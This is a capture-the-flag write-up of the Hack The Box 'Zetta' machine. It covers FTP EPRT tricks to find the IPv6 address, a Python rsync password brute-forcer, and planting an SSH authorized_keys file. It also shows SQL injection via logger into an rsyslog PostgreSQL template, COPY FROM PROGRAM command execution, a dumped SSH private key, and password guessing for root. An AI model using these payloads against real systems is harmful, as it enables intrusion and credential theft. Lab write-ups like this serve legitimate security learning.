# Zetta


Zetta box was the hardes box till I have done. It falls under linux and hard category. Here I will explain my path for Zetta box from the Hack The Box.
<!--more-->
---
# HTB:Zetta

Zetta box was the hardest box till I have done. It falls under linux and hard category. Especially to read the root flag is a quite tough one. I'll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag using ipv6 and rsync service by uploading my authorized_keys then I used postgres along with logger to read root.txt .I'll show all my payload(including that didn't work in initial deployment to get the root).

## Box Details

![description of the box](public/images/description_box.png "Description of the box")

In above picture it's ip is `10.10.10.156`, I added it to `/etc/hosts` as `zetta.htb`. Let's solve this box.


---

## Recon

Let's start with our universal port scanner `nmap` to see the open port and service which shows FTP(TCP 21),SSH(TCP 22) and HTTP(TCP 80).


```shell
root@gr4n173:~$ nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.156
Nmap 7.80 scan initiated Sat Jan 25 22:29:29 2020 as: nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.156
Nmap scan report for zetta.htb (10.10.10.156)
Host is up (0.29s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Pure-FTPd
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA)
|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA)
|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519)
80/tcp open  http    nginx
|_http-title: Ze::a Share
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Sat Jan 25 22:30:28 2020 -- 1 IP address (1 host up) scanned in 59.55 seconds

```
### Web Enumeration
**_zetta.htb_**

After I noticed port 80 `http` opened I visited that site and got this as output.

![Front Page](public/images/front_page.jpg "Front Page")

Then, I searched every part of this website and found something interesting things in 

>STUFF TO DO  
>Native FTP We support native FTP with FXP enabled. We also support RFC2428.

and also the credentials username/password for FTP service as below.
![Details of FTP](public/images/ftp_details.jpg "Details of FTP)

### FTP

With this detail I m into the `FTP` server now as.

```bash
root@gr4n173:~$ ftp zetta.htb
Connected to zetta.htb.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 500 allowed.
220-Local time is now 08:23. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
Name (zetta.htb:bikram): b6xsE32RXmPtAkGvDMpbWK7LCrC3r1SP
331 User b6xsE32RXmPtAkGvDMpbWK7LCrC3r1SP OK. Password required
Password:
230-This server supports FXP transfers
230-OK. Current restricted directory is 
230-0 files used (0%) - authorized: 10 files
230 0 Kbytes used (0%) - authorized: 1024 Kb
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```
here you can see `FXP transfers` supports so I used this and got IPV6 from IPV4. If you are familiar with this then you can skip this blog but if you are unknown about this IPV6 and want to know how I got that then you can have a look at this [RFC2428](https://tools.ietf.org/html/rfc2428).

At first I had set tcpdump listner as 

```bash
root@gr4n173:~$tcpdump -lni tun0 -vvvvvvvv ip6
tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes

```
Now using this commands:-

```ftp
ftp> quote EPRT |1|10.10.10.156|2222|
200-FXP transfer: from 10.10.16.25 to 10.10.10.156
200 PORT command successful
ftp> quote EPRT |2|2001:41d0:52:a00::e66|2222|
200-FXP transfer: from 10.10.10.156 to 2001:41d0:52:a00::e66%176
200 PORT command successful
ftp> quote EPRT |1|10.10.10.156|2222|
200-FXP transfer: from 2001:41d0:52:a00::e66%176 to 10.10.10.156
200 PORT command successful
ftp> quote EPRT |2|dead:beef:2::11df|2222|
200-FXP transfer: from 10.10.10.156 to dead:beef:2::11df%160
200 PORT command successful
ftp> LIST
?Invalid command
ftp> quote LIST
425 Could not open data connection to port 2222: Connection refused
ftp>

```
from first command 

```bash
quote EPRT |1|10.10.10.156|2222|
quote EPRT |2|2001:41d0:52:a00::e66|2222|
```
this specifies server should use IPV4 to open a data connection to host of zetta.htb on port 2222 and similar for second command IP6 . Now in third command IPV4 is activated again and IPV6 of my own ip which I got from `ifconfig` is used. 

This was I got IPV6 as _**dead:beef::250:56ff:febd:a9a4**_

```bash
root@gr4n173:~$ tcpdump -lni tun0 -vvvvvvvv ip6
tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
21:57:25.140243 IP6 (flowlabel 0x924d3, hlim 63, next-header TCP (6) payload length: 40) dead:beef::250:56ff:febd:a9a4.51208 > dead:beef:2::11df.2222: Flags [S], cksum 0x9b6f (correct),
seq 2652376284, win 28800, options [mss 1337,sackOK,TS val 1847133177 ecr 0,nop,wscale 7], length 0
21:57:25.140287 IP6 (flowlabel 0x55bf9, hlim 64, next-header TCP (6) payload length: 20) dead:beef:2::11df.2222 > _dead:beef::250:56ff:febd:a9a4_.51208: Flags [R.], cksum 0xe556 (correct),
seq 0, ack 2652376285, win 0, length 0

```
I pinged to this IPV6 and I got pinged back which indicates it was working fine. Now I tried again with nmap for IPV6 and got this with rsync service at port 8730 as 

```bash
root@gr4n173:~$nmap -sV -sC -6 dead:beef::250:56ff:febd:a9a4 -p 1-10000
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 22:23 +0545
Nmap scan report for dead:beef::250:56ff:febd:a9a4
Host is up (0.28s latency).
Not shown: 9996 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Pure-FTPd
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA)
|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA)
|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519)
80/tcp   open  http    nginx
|_http-title: Ze::a Share
8730/tcp open  rsync   (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| address-info: 
|   IPv6 EUI-64: 
|     MAC address: 
|       address: 00:50:56:bd:a9:a4
|_      manuf: VMware

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 320.92 seconds
```
## Rsync-> authorized_keys-> User.txt

I googled and read everything regarding the service rsync and made some script with nmap as 

```bash
root@gr4n173:~$ nmap -sV -6 --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 dead:beef::250:56ff:febd:a9a4
```
but this didn't work though so I searched other way to get remote rsync to the server and finally this worked for me.

```bash
 root@gr4n173:~$rsync -av rsync://[dead:beef::250:56ff:febd:a9a4]:8730/etc/rsyncd.conf  /tmp/rsyncd.conf 
```

### Script in Python

From here I got username `roy` now, I had to crack password of user roy. For that, I had wrote an script in python using pexpect to sending and receiving the files over socket. You can download script from [here](exploit.py)

```python
#!/bin/python3

import pexpect
p=open('/usr/share/wordlists/rockyou.txt','r')
for x in p:

    login = pexpect.spawn('rsync -6 -rdt rsync://roy@[dead:beef::250:56ff:febd:a9a4]:8730/home_roy/.ssh ssh')
    login.expect('Password:')
    login.sendline(x)
    if "auth failed on module" not in login.read():
       break
    else:
       print(x)
       
```
from here I got the password of user roy as :- computer
Now I tried to download the id_rsa key of roy user but that fails since roy didn't have id_rsa key instead used my own authorized_keys to get the shell of user roy. 

```bash
 root@gr4n173:~$rsync -rdt authorized_keys -6 -rdt rsync://roy@[dead:beef::250:56ff:febd:7d3b]:8730/home_roy/.ssh
```
Here now authorized_keys let me to  shell of user roy and also I had used the user roy along with it's password `computer`.

## Shell as roy

 Finally I got the shell of roy and got the `user.txt` as
 
```bash
root@gr4n173:~$ ssh roy@zetta.htb
Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
Last login: Sat Feb 15 22:05:58 2020 from 10.10.14.193
roy@zetta:~$ whoami
roy
roy@zetta:~$ ls
user.txt
roy@zetta:~$ cat user.txt
a575bdb*************************
```


### Postgresql Exploit

After I got user.txt i.e. roy shell ,I found .tudu.xml file in home directory of roy where many to do list was written.

```html
.......

					<todo done="no" collapse="no">                                                                                            
                                <title>Check postgresql log for errors after configuration</title>                                                    
                                <text>                                                                                                                
</text>                                                                                                                                               
                        </todo>                                                                                                                       
                        <todo done="yes" collapse="no">
                                <title>Prototype/test DB push of syslog events</title>
                                <text> 
</text>
                        </todo>
                        <todo done="no" collapse="no">
                                <title>Testing</title>
                                <text> 
</text>
                        </todo>
                        <todo done="no" collapse="no">
                                <title>Rework syslog configuration to push all events to the DB</title>
                                <text> 
</text>
                        </todo>
                        <todo done="no" collapse="no">
                                <title>Find/write GUI for syslog-db access/view</title>
                                <text> 
........

```

From above todo list I had to check postgresql log for errors, Hence it confirmed me to exploit log. After a lot of enumeration I found something fishy in `/etc/rsyslog.d/.git` where I found _pgsql.conf_ but I wasn't able to cat that file due to permission error. So I used other ways to read that file. For that I used git command since, there is .git repo in that directory as 

```bash
roy@zetta:/tmp$ cd /etc/rsyslog.d/
roy@zetta:/etc/rsyslog.d$ git clone /etc/rsyslog.d/.git /tmp/.git
Cloning into '/tmp/.git'...
done.
roy@zetta:/etc/rsyslog.d$ ls -al /tmp/.git/
total 16
drwxr-xr-x  3 roy  roy  4096 Feb 20 06:21 .
drwxrwxrwt 11 root root 4096 Feb 20 06:21 ..
drwxr-xr-x  8 roy  roy  4096 Feb 20 06:21 .git
-rw-r--r--  1 roy  roy   807 Feb 20 06:21 pgsql.conf
```
Now I was able to cat that file and where the file indicates there is sql injection one of the template and gives more information about local logging. Logging was new for me so googled and collected information about it. If you have known about logging then you can escape this blog but if you are unknown about logging in syslog then you can click [here](http://nginx.org/en/docs/syslog.html).

```bash
roy@zetta:/tmp/.git$ cat pgsql.conf
### Configuration file for rsyslog-pgsql
### Changes are preserved
# https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html
# Used default template from documentation/source but adapted table
# name to syslog_lines so the Ruby on Rails application Maurice is
# coding can use this as SyslogLine object.
# template(name="sql-syslog" type="list" option.sql="on") {
  constant(value="INSERT INTO syslog_lines (message, devicereportedtime) values ('")
  property(name="msg")
  constant(value="','")
  property(name="timereported" dateformat="pgsql" date.inUTC="on")
  constant(value="')")
}
# load module
module(load="ompgsql")

#Only forward local7.info for testing.
local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")
```
Since there was sql in syslog postgres I tried to get the shell of postgres for that I used command as 

```bash
roy@zetta:/tmp/.git$ psql -d syslog
psql: FATAL:  role "roy" does not exist
```
where -d, --dbname=DBNAME   database name to connect to (default: "roy")

So,for that I tried to create the user roy using postgres, logger and sql injection so my payload was 

## Logger -> Sql -> Superuser roy

```bash
roy@zetta:~$ logger -p local7.info "aaa',current_timestamp);CREATE USER roy; --"
roy@zetta:~$ psql -d syslog
psql (11.4 (Debian 11.4-1))
Type "help" for help.

syslog=>
```
After that, I created the user roy for syslog and used the postgres command to see what things are inside the syslog database. Since this box got postgres I googled for latest exploit of postgresql and got `COPY FROM PROGRAM Command Execution vulnerability`. For more info about it you can click [here](https://www.exploit-db.com/exploits/46813).

And instead of using Metasploit I used the manual ways to exploit this vulnerability for that I used this blog [here](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/authenticated-arbitrary-command-execution-on-postgresql-9-3/).

On reading blogs to use `COPY` command user must be superuser only then I can exploit it. For that I changed the user _roy_ to superuser as

```
roy@zetta:~$ logger -p local7.info "aaa',current_timestamp);ALTER USER roy WITH SUPERUSER; --"                                                             
```

Now I exploit the postgres and able to run the command injection in syslog database. At my first attempt I was interrupted and unable to run command in postgres but after 2nd/3rd attempt I used (`$$`)Dollar-quoting for escaping single quotes in postgres to exploit command injection.

## Command Injection -> Postgres shell
```mysql
syslog=# CREATE TABLE RCE(RCE text);
CREATE TABLE
syslog=# COPY RCE FROM PROGRAM $$id$$; 
COPY 1
syslog=# SELECT * FROM RCE;
                                  rce                                   
------------------------------------------------------------------------
 postgres
 uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
(2 rows)
```
Now I have to get the postgres shell for that I should have id_rsa key. Now for that I found the `id_rsa` key of postgres in directory `/var/lib/postgres/.ssh/`
So for that I used that cat command in command injection and able to cat the RSA key.

```mysql
syslog=# COPY RCE FROM PROGRAM $$cat ../../.ssh/id_rsa$$;                                                                                                
COPY 6                                                                                                                                                
syslog=# SELECT * FROM RCE;                                                                                                                           
                                     rce                                                                                                              
------------------------------------------------------------------------------
 postgres
 uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
 /var/lib/postgresql/11/main
 total 20
 drwxr-xr-x  4 postgres postgres 4096 Jul 27  2019 .
 drwxr-xr-x 27 root     root     4096 Aug 27 05:39 ..
 drwxr-xr-x  3 postgres postgres 4096 Jul 27  2019 11
 lrwxrwxrwx  1 root     root        9 Jul 27  2019 .bash_history -> /dev/null
 -rw-------  1 postgres postgres  744 Jul 27  2019 .psql_history
 drwx------  2 postgres postgres 4096 Jul 27  2019 .ssh
 total 20
 drwx------ 2 postgres postgres 4096 Jul 27  2019 .
 drwxr-xr-x 4 postgres postgres 4096 Jul 27  2019 ..
 -rw------- 1 postgres postgres  747 Jul 27  2019 authorized_keys
 -rw------- 1 postgres postgres 3389 Jul 27  2019 id_rsa
 -rw-r--r-- 1 postgres postgres  747 Jul 27  2019 id_rsa.pub
 -----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

After that I copied `id_rsa` key to name `id_rsa` key in my local machine and used. This was I got postgres shell

```bash
root@gr4n173:~$ ssh -i id_rsa postgres@zetta.htb
Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
postgres@zetta:~$ whoami
postgres
postgres@zetta:~$ id
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
postgres@zetta:~$
```

## Postgres -> Root

Now I got the shell of user postgres and searched its home directory and got .psql_history.

```mysql
postgres@zetta:~$ cat .psql_history 
CREATE DATABASE syslog;
\c syslog
CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);
\d syslog_lines
ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
```
and I have todo list from shell of roy .tudu.xml and got this.

```html
  <todo done="no" collapse="no">
      <title>Change shared password scheme from &lt;secret&gt;@userid to something more secure.</title>
                                <text>
</text>
```

From above two notes: format of password of user posgres and todo list I made conclusion as password root should be `sup3rs3cur3p4ass@root`.
Finally that worked and got the `root shell` and `root.txt`.

```bash
postgres@zetta:~$ su root
Password: 
root@zetta:/var/lib/postgresql# cd
root@zetta:~# whoami
root
root@zetta:~# id
uid=0(root) gid=0(root) groups=0(root)
root@zetta:~# cat root.txt
b9407e837fb****************
```

This way I got the root of zetta box and learned alot from this box. So I would like to thank creator of this box `jkr` for such an awesome box.
	
I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.  
Feedback are really appreciated !!  
Tweet about this writeup if you like.

You can follow and see my blog in my medium profile: [gr4n173](https://medium.com/@gr4n173).

